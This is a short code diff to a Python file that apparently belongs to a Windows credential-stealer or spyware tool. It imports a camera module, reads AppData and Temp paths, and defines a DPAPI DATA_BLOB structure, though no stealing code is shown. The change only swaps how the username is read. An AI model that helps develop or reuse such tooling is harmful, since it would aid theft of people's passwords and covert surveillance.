@@ -4,7 +4,6 @@ import os
 import re
 import ctypes
 import pygame.camera
-import getpass
 import subprocess
 import threading
 import sys
@@ -58,7 +57,7 @@ Threadlist = []
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
-username = getpass.getuser()
+username = os.getlogin()
 
 class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
